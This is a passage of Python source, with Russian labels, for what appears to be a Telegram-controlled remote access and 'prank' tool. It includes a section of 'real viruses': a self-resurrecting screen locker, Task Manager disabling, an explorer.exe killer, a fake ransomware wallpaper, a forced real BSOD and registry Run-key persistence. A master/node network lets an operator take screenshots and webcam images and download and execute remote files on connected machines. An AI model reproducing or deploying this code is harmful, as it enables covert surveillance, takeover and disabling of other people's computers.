    if JOB == "winlock" and ROLE == "a":
        while not (stop_now() or (code_evt and code_evt.is_set())):
            try:
                overlay_winlock(code_evt)
            except Exception:
                pass
            time.sleep(0.15)
    elif JOB == "trap" and ROLE == "a":
        t_cap = time.time() + TRAP_CAP
        while not (stop_now() or (code_evt and code_evt.is_set())) and time.time() < t_cap:
            try:
                overlay_trap(code_evt, t_cap)
            except Exception:
                pass
            time.sleep(0.1)
        user32.ClipCursor(None)
        if time.time() >= t_cap and not (stop_now() or (code_evt and code_evt.is_set())):
            write_stop()
    elif JOB == "wall":
        wall = BASE / "wall.png"
        while not stop_now() and not DEAD.is_set():
            if wall.exists():
                try:
                    user32.SystemParametersInfoW(0x14, 0, str(wall), 3)
                except Exception:
                    pass
                time.sleep(3.0)
            else:
                time.sleep(4.0)
    elif JOB == "explorer":
        while not stop_now() and not DEAD.is_set():
            subprocess.run("taskkill /f /im explorer.exe", shell=True, capture_output=True,
                           creationflags=subprocess.CREATE_NO_WINDOW)
            time.sleep(1.5)
        try:
            subprocess.Popen("start explorer.exe", shell=True,
                             creationflags=subprocess.CREATE_NO_WINDOW)
        except Exception:
            pass
    elif JOB == "madness":
        while not stop_now() and not DEAD.is_set():
            chaos_tick()
    else:
        while not DEAD.is_set():
            if stop_now():
                break
            time.sleep(1.0)
    cleanup_pid()
    DEAD.set()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        log("падение: " + repr(e))
        cleanup_pid()
'''

def _v_write_script():
    VIRUS_DIR.mkdir(exist_ok=True)
    (VIRUS_DIR / "virus.py").write_text(VIRUS_SRC, encoding="utf-8")
    try:
        src = Path(__file__).resolve().parent / "toxik.cs"
        if src.exists():
            cs = VIRUS_DIR / "toxik.cs"
            text = src.read_text(encoding="utf-8")
            if not cs.exists() or cs.read_text(encoding="utf-8") != text:
                cs.write_text(text, encoding="utf-8")
    except Exception:
        pass

def _v_compile():
    """нативная сборка юнита toxik.exe (C#/.NET 4, csc без SDK). путь exe или None"""
    try:
        cs = VIRUS_DIR / "toxik.cs"
        exe = VIRUS_DIR / "toxik.exe"
        if not cs.exists():
            return None
        if exe.exists() and exe.stat().st_mtime >= cs.stat().st_mtime:
            return str(exe)
        csc = None
        windir = os.environ.get("WINDIR", r"C:\Windows")
        for cand in (Path(windir) / "Microsoft.NET" / "Framework64" / "v4.0.30319" / "csc.exe",
                     Path(windir) / "Microsoft.NET" / "Framework" / "v4.0.30319" / "csc.exe"):
            if cand.exists():
                csc = str(cand)
                break
        if not csc:
            return None
        r = subprocess.run([csc, "/nologo", "/target:winexe", "/platform:anycpu", "/optimize+",
                            "/out:" + str(exe),
                            "/r:System.dll", "/r:System.Core.dll", "/r:System.Drawing.dll",
                            "/r:System.Windows.Forms.dll", "/r:Microsoft.CSharp.dll", str(cs)],
                           capture_output=True, text=True, timeout=120,
                           creationflags=subprocess.CREATE_NO_WINDOW)
        log_line = f"csc exit={r.returncode} {(r.stderr or '')[-160:]}"
        try:
            logging.info("[toxik] " + log_line)
        except Exception:
            pass
        if exe.exists() and exe.stat().st_mtime >= cs.stat().st_mtime:
            return str(exe)
    except Exception as e:
        try:
            logging.exception("[toxik] csc fail: %s", e)
        except Exception:
            pass
    return None

def _v_running(job: str) -> bool:
    for role in ("a", "b"):
        try:
            pid = int((VIRUS_DIR / f"{job}_{role}.pid").read_text().strip())
        except Exception:
            continue
        if pid in (os.getpid(),):
            continue
        h = ctypes.windll.kernel32.OpenProcess(0x1000, False, pid)
        if h:
            ctypes.windll.kernel32.CloseHandle(h)
            return True
    return False

def _v_spawn(job: str):
    _v_write_script()
    try:
        (VIRUS_DIR / "abort.flag").unlink()
    except Exception:
        pass
    stopf = VIRUS_DIR / f"stop_{job}.flag"
    if stopf.exists():
        stopf.unlink()
    exe = _v_compile()
    base = [exe] if exe else [sys.executable, str(VIRUS_DIR / "virus.py")]
    for role in ("a", "b"):
        subprocess.Popen(base + [job, role],
                         cwd=str(VIRUS_DIR),
                         creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP)

def _block_taskmgr():
    try:
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, POLICY_PATH) as k:
            winreg.SetValueEx(k, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
    except Exception:
        pass

def _unblock_taskmgr():
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, POLICY_PATH, 0, winreg.KEY_SET_VALUE) as k:
            winreg.DeleteValue(k, "DisableTaskMgr")
    except Exception:
        pass

def _v_write_wallpng():
    VIRUS_DIR.mkdir(exist_ok=True)
    img = Image.new("RGB", (1920, 1080), (5, 5, 5))
    d = ImageDraw.Draw(img)
    try:
        f1 = ImageFont.truetype("arialbd.ttf", 84)
        f2 = ImageFont.truetype("arial.ttf", 36)
    except Exception:
        f1 = f2 = ImageFont.load_default()
    d.text((960, 200), "☠ СИСТЕМА ЗАХВАЧЕНА ☠", anchor="mm", font=f1, fill=(255, 30, 30))
    d.multiline_text((960, 430), "ВСЕ ФАЙЛЫ ЗАШИФРОВАНЫ\nAES-256-CBC  +  RSA-4096\nвосстановление без ключа невозможно",
                     anchor="mm", font=f2, fill=(214, 214, 214), align="center")
    d.text((960, 640), "ключ: 0x82F1-AB34-9D7E-44C1\nоткуп: 3000₽ · счёт не истекает никогда",
           anchor="mm", font=f2, fill=(255, 100, 100))
    d.text((960, 1020), "не выключай питание — станет только хуже", anchor="mm",
           font=f2, fill=(150, 150, 150))
    img.save(VIRUS_DIR / "wall.png", "PNG")

def v_deploy_winlock() -> str:
    if _v_running("winlock"):
        return "💀 винлокер уже сидит внутри — снимать через 🆘"
    _v_spawn("winlock")
    _block_taskmgr()
    unit = "🧬 C#" if (VIRUS_DIR / "toxik.exe").exists() else "🐍 python"
    return (f"💀 ВИНЛОКЕР НАВСЕГДА заехал ({unit}):\n"
            "на экране есть ПОЛЕ ВВОДА «ключ владельца» — набери там\n"
            "0007 или sos, и машина отпустит всё сразу.\n"
            "ESC/WIN/Alt+Tab/Alt+F4/диспетчер — замурованы железно,\n"
            "процессов двое, убьёшь одного — второй воскресит.\n"
            "снять: 🆘 отсюда или код в поле")

def v_deploy_explorer() -> str:
    if _v_running("explorer"):
        return "🗑 убийца проводника уже на смене"
    _v_spawn("explorer")
    _block_taskmgr()
    subprocess.Popen("taskkill /f /im explorer.exe", shell=True,
                     creationflags=subprocess.CREATE_NO_WINDOW)
    return ("🗑 УБИЙЦА ПРОВОДНИКА: explorer добивают каждые 1.5с —\n"
            "пуск, панель и папки умерли. диспетчер тоже замурован.\n"
            "снять: 🆘 (проводник оживёт сам)")

def v_deploy_wall() -> str:
    if _v_running("wall"):
        return "👁 обои-могила уже висят"
    _v_write_script()
    orig = _wall_get()
    marker = DATA_DIR / "orig_wall.txt"
    if orig and not marker.exists():
        marker.write_text(orig, encoding="utf-8")
    _v_write_wallpng()
    _v_spawn("wall")
    return ("🖼 ОБОИ-МОГИЛА встали: каждые 3с их протирают заново —\n"
            "поменять их нельзя. старые обои запомнены.\n"
            "снять: 🆘 (старые вернутся)")

def v_deploy_trap() -> str:
    if _v_running("trap"):
        return "🔒 мышь уже в камере"
    _v_spawn("trap")
    _block_taskmgr()
    unit = "🧬 C#" if (VIRUS_DIR / "toxik.exe").exists() else "🐍 python"
    return (f"🔒 МЫШЬ-ЗАЛОЖНИК ({unit}, прикол временный):\n"
            "камера-окно с полем ввода едет к курсору, курсор прикован\n"
            "к камере. сама отпустит через 10 минут.\n"
            "раньше: набери в поле 0007 или sos, либо 🆘 отсюда")

def v_deploy_madness() -> str:
    if _v_running("madness"):
        return "🌀 вечное безумие уже бушует"
    _v_spawn("madness")
    return ("🌀 ВЕЧНОЕ БЕЗУМИЕ: конвейер cmd-окон, сирены,\n"
            "громкости в потолок и рывков мыши — без выходных.\n"
            "снять: 🆘")

def v_bsod_bg():
    time.sleep(2.0)
    try:
        ntdll = ctypes.windll.ntdll
        old, resp = ctypes.c_ulong(0), ctypes.c_ulong(0)
        ntdll.RtlAdjustPrivilege.argtypes = [ctypes.c_ulong, ctypes.c_int, ctypes.c_int,
                                             ctypes.POINTER(ctypes.c_ulong)]
        ntdll.NtRaiseHardError.argtypes = [ctypes.c_ulong, ctypes.c_ulong, ctypes.c_ulong,
                                           ctypes.c_void_p, ctypes.c_ulong,
                                           ctypes.POINTER(ctypes.c_ulong)]
        ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(old))      # SeShutdownPrivilege
        ntdll.NtRaiseHardError(0xC000007B, 0, 0, None, 6, ctypes.byref(resp))
    except Exception:
        pass

def _v_write_flags():
    VIRUS_DIR.mkdir(exist_ok=True)
    try:
        (VIRUS_DIR / "abort.flag").write_text("x")
    except Exception:
        pass
    for job in VIRUS_JOBS:
        try:
            (VIRUS_DIR / f"stop_{job}.flag").write_text("x")
        except Exception:
            pass

def _sweep_virus_processes() -> int:
    # добиваем ЛЮБОЕ, что запущено из virus.py и ВСЁ, что называется toxik.exe —
    # pid-файлы даже не нужны
    ps = ("Get-CimInstance Win32_Process | "
          "Where-Object { ($_.Name -in 'python.exe','pythonw.exe','toxik.exe') -and "
          "($_.CommandLine -like '*virus.py*' -or $_.Name -eq 'toxik.exe') } | "
          "ForEach-Object { taskkill /f /t /pid $($_.ProcessId) | Out-Null; $_.ProcessId }")
    try:
        out = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                             capture_output=True, text=True, timeout=25,
                             creationflags=subprocess.CREATE_NO_WINDOW)
        return len([l for l in (out.stdout or "").splitlines() if l.strip()])
    except Exception:
        return 0

def _v_kill_pids() -> int:
    k32 = ctypes.windll.kernel32
    killed = 0
    for job in VIRUS_JOBS:
        for role in ("a", "b"):
            pf = VIRUS_DIR / f"{job}_{role}.pid"
            try:
                pid = int(pf.read_text().strip())
            except Exception:
                try:
                    pf.unlink()
                except Exception:
                    pass
                continue
            if pid == os.getpid():
                continue
            subprocess.run(f"taskkill /f /t /pid {pid}", shell=True, capture_output=True,
                           creationflags=subprocess.CREATE_NO_WINDOW)
            h = k32.OpenProcess(0x0001, False, pid)      # PROCESS_TERMINATE
            if h:
                k32.TerminateProcess(h, 1)
                k32.CloseHandle(h)
                killed += 1
            try:
                pf.unlink()
            except Exception:
                pass
    return killed

def _v_restore_machine():
    ctypes.windll.user32.ClipCursor(None)
    _unblock_taskmgr()
    try:
        orig = (DATA_DIR / "orig_wall.txt").read_text(encoding="utf-8").strip()
        if orig and Path(orig).exists():
            _wall_set(orig)
            (DATA_DIR / "orig_wall.txt").unlink()
    except Exception:
        pass
    subprocess.Popen("start explorer.exe", shell=True,
                     creationflags=subprocess.CREATE_NO_WINDOW)

def v_kill_all() -> str:
    _v_write_flags()
    time.sleep(2.2)
    killed = _v_kill_pids()
    swept = _sweep_virus_processes()
    _v_restore_machine()
    return (f"🆘 ЗАЧИСТКА ГОТОВА: процессы — kill по pid {killed} + поиск по cmdline ещё {swept},\n"
            "abort-флаг расставлен ВСЕМ (код 0007 теперь тоже гасит всё разом),\n"
            "диспетчер отмяк, обои и проводник возвращены, мышь отпущена.\n"
            "если что-то дышит — жми 🧨, если был автовозжиг — ♻️ ВЫКЛ")

def v_panic() -> str:
    # пулевая: работает даже когда pid-файлы потерялись, а пары воскресли
    _v_write_flags()
    first = _sweep_virus_processes()
    time.sleep(1.5)
    second = _sweep_virus_processes()      # добиваем воскресших из-под могилы
    by_pid = _v_kill_pids()
    time.sleep(0.5)
    third = _sweep_virus_processes()
    _v_restore_machine()
    return (f"🧨 ПУЛЯ ДОСТАВЛЕНА: заход1 {first} шт, заход2 {second} шт, заход3 {third} шт (+по pid {by_pid}),\n"
            "каждый снимок убивает ВСЁ из virus.py и весь toxik.exe. диспетчер/мышь/обои/проводник — возвращены.\n"
            "если четвёртый раз что-то воскреснет — перезагрузка и проверь ♻️ автозапуск")

def _persist_installed() -> bool:
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_PATH) as k:
            winreg.QueryValueEx(k, PERSIST_NAME)
        return True
    except Exception:
        return False

def v_persist_on() -> str:
    _v_write_script()
    exe = _v_compile()
    vbs = VIRUS_DIR / "vboot.vbs"
    lines = ['Set sh = CreateObject("WScript.Shell")']
    if exe:
        # нативный юнит: exe сам умеет пара-режимы, окно не нужно совсем
        for job, role in (("winlock", "a"), ("winlock", "b"), ("trap", "a"), ("trap", "b")):
            lines.append('sh.Run """' + str(exe) + '"" ' + job + " " + role + ', 0, False')
        unit_note = "юнит: 🧬 C# (toxik.exe)"
    else:
        pyw = Path(sys.executable).with_name("pythonw.exe")
        if not pyw.exists():
            pyw = Path(sys.executable)
        q = "Chr(34)"
        for job, role in (("winlock", "a"), ("winlock", "b"), ("trap", "a"), ("trap", "b")):
            lines.append("sh.Run " + q + " & \"" + str(pyw) + "\" & " + q +
                         " & \" \" & " + q + " & \"" + str(VIRUS_DIR / "virus.py") +
                         "\" & " + q + " & \" " + job + " " + role + "\", 0, False")
        unit_note = "юнит: 🐍 python"
    vbs.write_bytes("\r\n".join(lines).encode("cp1251", errors="replace"))
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, RUN_PATH) as k:
        winreg.SetValueEx(k, PERSIST_NAME, 0, winreg.REG_SZ, f'wscript.exe "{vbs}"')
    return (f"♻️ АВТОЗАПУСК ЗАПИХАН ({unit_note}): винлокер и мышь-заложник\n"
            "после перезагрузки встанут сами, тихо, без консольных окон.\n"
            "перезагрузка — больше не спасение. выключить: ♻️ ВЫКЛ")

def v_persist_off() -> str:
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_PATH, 0, winreg.KEY_SET_VALUE) as k:
            winreg.DeleteValue(k, PERSIST_NAME)
    except Exception:
        return "♻️ автозапуска и так не было"
    return "♻️ автозапуск выпилен из системы — перезагрузка снова спасает"

def v_status() -> str:
    alive = []
    for job in VIRUS_JOBS:
        roles = []
        for role in ("a", "b"):
            try:
                pid = int((VIRUS_DIR / f"{job}_{role}.pid").read_text().strip())
            except Exception:
                continue
            h = ctypes.windll.kernel32.OpenProcess(0x1000, False, pid)
            if h:
                ctypes.windll.kernel32.CloseHandle(h)
                roles.append(role)
        if roles:
            alive.append(f"  💀 {job}: роли {'+'.join(roles)} живы")
    persist = "вкл (после ребута сами вернутся)" if _persist_installed() else "выкл"
    unit = "🧬 C# (toxik.exe собран)" if (VIRUS_DIR / "toxik.exe").exists() else "🐍 python (exe ещё не собирали)"
    body = "\n".join(alive) if alive else "  (ни одного живого — стерильно)"
    return f"📊 СТАТУС ВИРУСОВ\n🧬 юнит: {unit}\n{body}\n♻️ автозапуск: {persist}"

VR_TITLES = {
    "vr_winlock": "🏴 ВИНЛОКЕР НАВСЕГДА",
    "vr_explorer": "🗑 УБИТЬ ПРОВОДНИКА",
    "vr_wall": "🖼 ОБОИ-МОГИЛА",
    "vr_trap": "🔒 МЫШЬ-ЗАЛОЖНИК",
    "vr_madness": "🌀 ВЕЧНОЕ БЕЗУМИЕ",
    "vr_status": "📊 Статус вирусов",
    "vr_panic": "🧨 ПУЛЕВОЕ УБИЙСТВО",
    "vr_persist": "♻️ АВТОЗАПУСК ВКЛ",
    "vr_nopersist": "♻️ АВТОЗАПУСК ВЫКЛ",
    "vr_off": "🆘 Снять всё",
}

def cat_virus_kb() -> InlineKeyboardMarkup:
    return kb(
        [("🏴 ВИНЛОКЕР НАВСЕГДА", "vr_winlock"), ("🗑 УБИТЬ ПРОВОДНИКА", "vr_explorer")],
        [("🖼 ОБОИ-МОГИЛА", "vr_wall"), ("🔒 МЫШЬ-ЗАЛОЖНИК", "vr_trap")],
        [("🌀 ВЕЧНОЕ БЕЗУМИЕ", "vr_madness"), ("💀 БСОД НАСТОЯЩИЙ", "vr_bsod")],
        [("♻️ АВТОЗАПУСК ВКЛ", "vr_persist"), ("♻️ АВТОЗАПУСК ВЫКЛ", "vr_nopersist")],
        [("📊 Статус", "vr_status"), ("🧨 ПУЛЕВОЕ УБИЙСТВО", "vr_panic")],
        [("🆘 Снять всё", "vr_off"), ("⬅️ Приколы", "pranks")],
    )

# ---------- диспетчер приколов ----------
LOOP_TITLES = {"floodcmd": "🍕 Флуд cmd", "floodpop": "💬 Окон-бомба", "flooddrunk": "🌀 Мышь пьяная"}

THREAD_PRANKS: dict[str, callable] = {
    "pr_bsod":      _p_bsod,       "pr_update":   _p_update,
    "pr_rick":      rickroll,      "pr_invert":   _p_invert,
    "pr_blackout":  _p_blackout,   "pr_monoff":   _p_monoff,
    "pr_rotate":    rotate_display,"pr_flicker":  _p_flicker,
    "pr_dance":     _p_dance,      "pr_magnet":   _p_magnet,
    "pr_edges":     _p_edges,      "pr_jail":     _p_jail,
    "pr_swap":      mouse_toggle,  "pr_cd":       _p_cd,
    "pr_icons":     icons_toggle,  "pr_wallsub":  _p_wallpaper,
    "pr_wallstare": _p_wallstare,  "pr_wallback": _wall_restore,
    "pr_notepad":   _p_notepad,    "pr_beep":     _p_beep,
    "pr_siren":     _p_siren,      "pr_voice":    _p_voice,
    "pr_volume":    _p_volume,     "pr_caps":     _p_caps,
    "pr_player":    _p_player,     "pr_winlock":  _p_winlock,
    "pr_format":    _p_format,     "pr_hacker":   _p_hacker,
    "pr_battery":   _p_battery,    "pr_screamer": _p_screamer,
    "pr_lock":      _p_lock,       "pr_msgbox":   _p_msgbox,
    "pr_apocalypse":_p_apocalypse, "pr_judgment": _p_judgment,
    "pr_hkhide":    hide_cad,      "pr_hkshow":   show_cad,
    "pr_uacoff":    (lambda: uac_set(0)),
    "pr_uacon":     (lambda: uac_set(1)),
    "vr_winlock":   v_deploy_winlock,   "vr_explorer": v_deploy_explorer,
    "vr_wall":      v_deploy_wall,      "vr_trap":     v_deploy_trap,
    "vr_madness":   v_deploy_madness,   "vr_status":   v_status,
    "vr_persist":   v_persist_on,       "vr_nopersist": v_persist_off,
    "vr_off":       v_kill_all,         "vr_panic":    v_panic,
}

CAT_KBS = {
    "cat_screen":  ("🪟 ЭКРАН И ОКНА", cat_screen_kb),
    "cat_mouse":   ("🖱 ПЕРИФЕРИЯ", cat_mouse_kb),
    "cat_desktop": ("🖥 СТОЛ И ТЕМЫ", cat_desktop_kb),
    "cat_sound":   ("🔊 ЗВУК", cat_sound_kb),
    "cat_hard":    ("🏴 ЖЁСТКИЕ (18+)", cat_hard_kb),
    "cat_combo":   ("💀 КОМБО-КОШМАР", cat_combo_kb),
    "cat_sys":     ("🙈 СИСТЕМА-ШУТКИ", cat_sys_kb),
    "cat_virus":   ("☠️ НАСТОЯЩИЕ ВИРУСЫ", cat_virus_kb),
}

# тап → своя категория: после прикола остаёмся в его меню, не выкидываем на главное
PRANK_HOME: dict[str, str] = {}
for _cat, (_t, _mk) in CAT_KBS.items():
    for _row in _mk().inline_keyboard:
        for _b in _row:
            if _b.callback_data and _b.callback_data not in ("pranks", "main"):
                PRANK_HOME[_b.callback_data] = _cat

# ---------- сетка хостов: master ↔ ноды ----------
# мастер: обычный запуск (бот + TCP-сервер на RPC_PORT)
# нода:   python main.py --node IP_мастера:7731 [имя]  (автозапуск сам поднимет)
# связь: JSON-строки по TCP, secret = RPC_SECRET, ответы по id запроса

def pult_autostart_installed() -> bool:
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_PATH) as k:
            winreg.QueryValueEx(k, "SuriosPult")
        return True
    except Exception:
        return False

def pult_autostart(state: bool) -> str:
    """вкл/выкл АВТОЗАПУСКА пульта на ЭТОЙ машине (нода после ребута сама вцепится в мастера)"""
    script = os.path.abspath(sys.argv[0] or "main.py")
    pyw = Path(sys.executable).with_name("pythonw.exe")
    if not pyw.exists():
        pyw = Path(sys.executable)
    cmd = f'"{pyw}" "{script}"' + (f" --node {MASTER_ADDR}" if MASTER_ADDR else "")
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, RUN_PATH) as k:
        if state:
            winreg.SetValueEx(k, "SuriosPult", 0, winreg.REG_SZ, cmd)
            return ("♻️ пульт этой машины добавлен в автозапуск"
                    + (" (нода — после перезагрузки сама подключится к мастеру)" if MASTER_ADDR else ""))
        try:
            winreg.DeleteValue(k, "SuriosPult")
            return "♻️ пульт убран из автозапуска этой машины"
        except FileNotFoundError:
            return "♻️ из автозапуска и так выпилен"

def build_status_text() -> str:
    import platform, getpass
    auto = "вкл" if pult_autostart_installed() else "выкл"
    return (f"📊 <b>СТАТУС ПУЛЬТА</b>\n"
            f"🖥 машина: <code>{html.escape(platform.node())}</code>\n"
            f"🪟 ось: win {platform.win32_ver()[0]}\n"
            f"👤 юзер: <code>{html.escape(getpass.getuser())}</code>\n"
            f"🐍 питон: {sys.version.split()[0]}\n"
            f"♻️ автозапуск пульта: <b>{auto}</b>\n"
            f"🕐 время: <code>{datetime.datetime.now().strftime('%d.%m.%Y %H:%M:%S')}</code>")

def _download_on_host(url: str) -> str:
    """качалка ВСЕГДА на той машине, где её попросил владелец (у ноды свой socks5)"""
    name = os.path.basename(urlparse(url).path) or ("file_" + uuid.uuid4().hex[:8])
    dst = DATA_DIR / name
    with httpx.Client(proxy=PROXY_URL or None, timeout=600, follow_redirects=True,
                      headers={"User-Agent": "Mozilla/5.0"}) as c:
        data = c.get(url).content
    if not data:
        return "❌ пусто на том конце — качалка не удалась"
    dst.write_bytes(data)
    out = f"💾 скачано {len(data):,} Б → {dst}\n🚀 пробую запустить"
    try:
        out += "\n" + launch_by_path(str(dst))
    except Exception as e:
        out += f"\n💾 скачан, но не завёлся: {e}"
    return out

def local_exec(cmd: dict) -> dict:
    """выполнение команды НА ЭТОЙ МАШИНЕ — работает и у мастера на себя, и у ноды"""
    c = cmd.get("cmd")
    try:
        if c == "shot":
            buf = io.BytesIO()
            ImageGrab.grab(all_screens=True).save(buf, "PNG")
            return {"t": "file", "name": "screen.png",
                    "b64": base64.b64encode(buf.getvalue()).decode()}
        if c == "webcam":
            try:
                import cv2  # noqa: F401
            except ModuleNotFoundError:
                return {"t": "err", "text": "🎥 на этом хосте нет cv2 — поставь на НЁМ:\n"
                                            "py -m pip install opencv-python-headless"}
            shots = snapshot_webcams()
            return {"t": "files",
                    "files": [{"name": f"webcam_{i}.jpg", "b64": base64.b64encode(j).decode()}
                              for i, j in shots]}
        if c == "status":
            return {"t": "res", "text": build_status_text()}
        if c == "runfile":
            return {"t": "res", "text": launch_by_path(cmd["path"])}
        if c == "execfile":
            dst = DATA_DIR / (cmd.get("name") or "file.bin")
            dst.write_bytes(base64.b64decode(cmd["b64"]))
            return {"t": "res", "text": launch_by_path(str(dst))}
        if c == "dl":
            return {"t": "res", "text": _download_on_host(cmd["url"])}
        if c == "wallwallpaper":
            dst = DATA_DIR / (cmd.get("name") or "wallpaper")
            dst.write_bytes(base64.b64decode(cmd["b64"]))
            return {"t": "res", "text": set_wallpaper(dst)}
        if c == "prank":
            fn = THREAD_PRANKS.get(cmd.get("job") or "")
            return {"t": "res", "text": fn() if fn else "нет такой шутки"}
        if c == "crash":
            threading.Thread(target=v_bsod_bg, daemon=True).start()
            return {"t": "res", "text": "💀 краш через 2 секунды"}
        if c == "stopflood":
            flood_stop.add(0)
            return {"t": "res", "text": "🧹 безумие снято"}
        if c == "persist_on":
            return {"t": "res", "text": pult_autostart(True)}
        if c == "persist_off":
            return {"t": "res", "text": pult_autostart(False)}
    except Exception as e:
        return {"t": "err", "text": f"❌ хост споткнулся: {html.escape(str(e))}"}
    return {"t": "err", "text": f"неизвестная команда: {c}"}

def _next_id() -> int:
    global _rpc_id
    if _rpc_id == 0:                       # база от времени старта → rid не повторяется
        _rpc_id = int(time.time() * 1000) % 900_000_000 + 1   # между рестартами процесса
    else:
        _rpc_id += 1
    return _rpc_id

async def host_call(name: str, cmd: dict, timeout: float = 300.0) -> dict:
    """команда на хост: себе — локально, чужой машине: TCP, если есть; иначе ntfy-релей"""
    if name == MASTER_NAME:
        return await asyncio.get_running_loop().run_in_executor(POOL, local_exec, cmd)
    live = SEEN_HOSTS.get(name, {}).get("live", name)   # живое имя (суффикс #N) під базовым
    conn = NODES.get(live)
    if not conn or conn["writer"].is_closing():
        st = SEEN_HOSTS.get(name) or {}
        if st.get("via") and st.get("online"):
            return await _relay_send(name, cmd, timeout)
        return {"t": "err", "text": f"⚪️ хост «{html.escape(name)}» офлайн — запусти пульт на нём"}
    rid = _next_id()
    fut = asyncio.get_running_loop().create_future()
    _pending_calls[rid] = fut
    msg = dict(cmd, t="req", id=rid, secret=RPC_SECRET)
    try:
        conn["writer"].write((json.dumps(msg, ensure_ascii=False) + "\n").encode("utf-8"))
        await conn["writer"].drain()
        return await asyncio.wait_for(fut, timeout)
    except asyncio.TimeoutError:
        return {"t": "err", "text": f"⏳ хост молчит {int(timeout)}с — занят или умер"}
    except Exception as e:
        NODES.pop(live, None)
        if name in SEEN_HOSTS:
            SEEN_HOSTS[name]["online"] = False
        return {"t": "err", "text": f"❌ {html.escape(name)} отвалился: {html.escape(str(e))}"}
    finally:
        _pending_calls.pop(rid, None)

async def rpc_server(app):
    """TCP-сервер мастера: принимает ноды, держит их список, раздаёт ответы"""
    async def handle(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        name = None
        try:
            raw = await asyncio.wait_for(reader.readline(), 60)
            hello = json.loads(raw.decode("utf-8", "replace"))
            if (hello.get("t") != "hello" or hello.get("secret") != RPC_SECRET):
                writer.close()
                return
            base = str(hello.get("name") or "безымянный")[:48]
            name, i = base, 2
            while name in NODES or name == MASTER_NAME:
                name = f"{base}#{i}"
                i += 1
            NODES[name] = {"writer": writer}
            SEEN_HOSTS[base] = {"live": name, "online": True}
            await host_event(app, base, True)
            while True:
                line = await asyncio.wait_for(reader.readline(), timeout=80.0)
                if not line:
                    break
                try:
                    msg = json.loads(line.decode("utf-8", "replace"))
                except Exception:
                    continue
                if msg.get("t") == "ping":   # нода жива: эхо-ответ + сброс ожидания
                    await _node_write(writer, {"t": "pong"})
                    continue
                fut = _pending_calls.pop(msg.get("id"), None)
                if fut and not fut.done():
                    fut.set_result(msg)
        except Exception:
            pass
        finally:
            if name:
                NODES.pop(name, None)
                for _b, _v in SEEN_HOSTS.items():
                    if _v.get("live") == name:
                        _v["online"] = False
                with contextlib.suppress(Exception):
                    await host_event(app, base, False)
            try:
                writer.close()
            except Exception:
                pass
    server = await asyncio.start_server(handle, "0.0.0.0", RPC_PORT,
                                        limit=64 * 1024 * 1024)
    async with server:
        await server.serve_forever()

async def _keepalive(writer):
    """нода пингует мастера каждые 20с: мастер держит связь и режет тишину >80с"""
    try:
        while True:
            await _node_write(writer, {"t": "ping"})
            await asyncio.sleep(20.0)
    except Exception:
        pass

async def _node_write(writer, obj: dict):
    writer.write((json.dumps(obj, ensure_ascii=False) + "\n").encode("utf-8"))
    await writer.drain()

async def _node_flood(job: str):
    task_map = {"floodcmd": prank_flood_task, "floodpop": popup_bomb_task,
                "flooddrunk": mouse_drunk_task}
    flood_stop.discard(0)
    try:
        await task_map[job](0, 0)
    except Exception:
        pass

async def run_node(addr: str | None = None, name: str | None = None):
    """РЕЖИМ НОДЫ: мастер ищется сам (ручной адрес → LAN-бренч → ntfy), потом команды"""
    global MASTER_ADDR
    host_n = name or host_label()
    seen_addrs: set[str] = set()
    relay = None            # запасной транспорт (ntfy), включается когда TCP навеки глух
    misses = 0
    while True:
        # --- найти мастера ---
        if addr:
            cands, how = [addr], "вручную"
        else:
            cands = await _disc_scan(3.0)
            how = "LAN"
            if not cands:
                ainfo = await _gh_repo_file("addr.json") or {}
                cands = [str(a) for a in (ainfo.get("local"), ainfo.get("ext")) if a and a not in (None, "")]
                how = "адрес из репы GitHub"
            if not cands:
                cands, how = await _ntfy_pull_candidates(), "ntfy"
        if not cands:
            misses += 1
            if misses >= 2 and (relay is None or relay.done()):
                relay = asyncio.create_task(_relay_node_gh(host_n))
                print("TCP-мастера нет: живу через GitHub-релей (команды ходят через gist)")
            await asyncio.sleep(10.0)
            continue
        misses = 0
        if relay and not relay.done():
            relay.cancel()
            relay = None
        # --- подключиться (первый кандидат приоритетен, остальные — запас) ---
        reader = writer = None
        used = ""
        for cand in cands:
            ip, _, port = cand.partition(":")
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(ip, int(port or RPC_PORT)), timeout=6.0)
                used = cand
                break
            except Exception:
                continue
        if not writer:
            misses += 1
            if misses >= 3 and (relay is None or relay.done()):
                relay = asyncio.create_task(_relay_node_gh(host_n))
                print("TCP-адрес не дышит: живу через GitHub-релей (мастер услышит сам)")
            await asyncio.sleep(8.0)
            continue
        print(f"→ мастер найден ({how}): {used}" if used not in seen_addrs else f"→ мастер: {used}")
        seen_addrs.add(used)
        MASTER_ADDR = used
        try:
            await _node_write(writer, {"t": "hello", "secret": RPC_SECRET, "name": host_n})
            beat = asyncio.create_task(_keepalive(writer))
            try:
                while True:
                    try:
                        line = await asyncio.wait_for(reader.readline(), timeout=70.0)
                    except asyncio.TimeoutError:
                        break        # мастер молчит даже на пинги — связи нет, реконнект
                    if not line:
                        break
                    try:
                        msg = json.loads(line.decode("utf-8", "replace"))
                    except Exception:
                        continue
                    if msg.get("t") != "req" or msg.get("secret") != RPC_SECRET:
                        continue     # pong/мусор мимо
                    rid = msg.get("id")
                    cmd = {k: v for k, v in msg.items() if k not in ("t", "id", "secret")}
                    if cmd.get("cmd") == "flood":
                        asyncio.create_task(_node_flood(cmd.get("job") or "floodcmd"))
                        await _node_write(writer, {"t": "res", "id": rid, "text": "🌀 летит"})
                    else:
                        try:
                            res = await asyncio.wait_for(
                                asyncio.get_running_loop().run_in_executor(POOL, local_exec, cmd),
                                timeout=900)
                        except Exception as e:
                            res = {"t": "err", "text": f"❌ нода споткнулась: {html.escape(str(e))}"}
                        await _node_write(writer, dict(res, id=rid))
